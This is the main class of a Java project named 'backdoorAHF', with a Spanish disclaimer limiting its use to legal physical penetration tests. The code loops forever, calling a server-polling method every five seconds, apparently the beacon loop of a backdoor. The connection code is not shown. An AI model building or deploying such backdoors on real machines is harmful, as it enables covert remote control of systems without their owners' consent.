package org.backdoorAHF;



/**
 * el autor no se responsabiliza del mal uso que se le de a este software
 * el su uso malintencionado podria tener acciones legales
 * utilizalo solo para realizar test de penetracion fisica en empresas
 * bajo un ambiente legal
 * quedas advertido
 * @author matiasheredia
 *
 */
public class App 
{
    public static void main( String[] args ) throws Exception
    {
    	
    	while(true)
    		{
    	    try {
				Thread.sleep(5000);
			} catch (InterruptedException e) {
			}
    	org.backdoorAHF.service.Conection.questionToServer();
    		}
    	
 
    }
    	
}
